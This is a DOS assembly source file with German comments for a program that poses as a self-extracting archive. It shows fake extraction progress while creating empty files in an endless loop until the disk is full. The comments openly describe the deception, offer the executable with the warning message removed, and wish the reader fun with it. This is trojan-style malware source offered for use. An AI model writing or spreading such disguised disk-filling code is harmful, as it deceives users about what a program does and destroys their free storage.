;die programm erstellt max. 95060119441637376 Dateien in dem Verzeichnis, in dem es sich
;befindet. die dateinamen werden nach einer tollen formel erzeugt. gestoppt werden muss
;durch Abbruch oder Platzmangel. (Bei einer 1,44MB Floppy schon bei 224 Dateien)
;Das Programm zeigt an, dass es Dateien entpackt. Pro Punkt erstellt es aber 100 Dateien
;das Ausführbare Programm gibts bei RafaelFriesen@aol.com (auch ohne die Meldung am Anfang)
;viel Spass damit wünscht Rafael Friesen

.model tiny
.code
;Meld ausgeben
mov dx,offset Meld
mov ax,0900h
int 21h
mov dx,offset dat
sub dx,7
int 21h

;viele dateien erzeugen
los:
;datei öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat
int 021
;datei schliessen
mov bx,ax
mov ax,03e00
int 021

;nächsten Dateinamen generieren
;erste Stelle
mov al,[offset dat]
inc al
cmp al,"Z"
jle eins
mov al,"A"
dec b[offset dat+1]
eins: 
mov [offset dat],al
;restliche Stellen des Dateinamens
mov bx,1
zwei:
mov al,[offset dat+bx]
inc al
cmp al,"9"
jne drei
mov al,"A"
drei:
cmp al,"Z"
jle vier
mov al,"0"
dec b[offset dat+1+bx]
vier: 
mov [offset dat+bx],al
inc bx
cmp bx,8
jne funf
cmp b[offset dat+8],"."
je sechs
inc b[offset dat+8]
dec b[offset dat+9]
sechs:
inc bx
funf:
cmp bx,11
jle zwei
cmp b[offset dat+12],0
je sieben
inc b[offset dat+12]
sieben:
dec b[offset zlr1]
cmp b[offset zlr1],0
jne acht
mov b[offset zlr1],100
mov dx,offset punkt
mov ax,0900h
int 21h
dec b[offset zlr2]
cmp b[offset zlr2],0
jne acht
mov cx,bx
inc b[offset zlr3]
mov bh,1
mov bl,[offset zlr3]
mov al,[bx]
and al,127
inc al
mov b[offset zlr2],al
mov bx,cx
mov dx,offset ready
mov ax,0900h
int 21h
acht:
;zum anfang
jmp los

.data
zlr1:	db 100
zlr2:	db 250
zlr3:	db 0
Meld:	db "Selbstentpackendes Archiv. Erstellt von: Rafael.",0d,0a
	db "Die Dateien werden in den Ordner entpackt, in dem sich das Archiv befindet.",0d,0a
	db "Dieses Archiv ist nach einmaligem Entpacken unbrauchbar.",0d,0a,0a,"$"
punkt:	db ".$"
ready:	db " OK",0d,0a,"->"
dat:	db "ARCHIV23.COM",0,"$"
end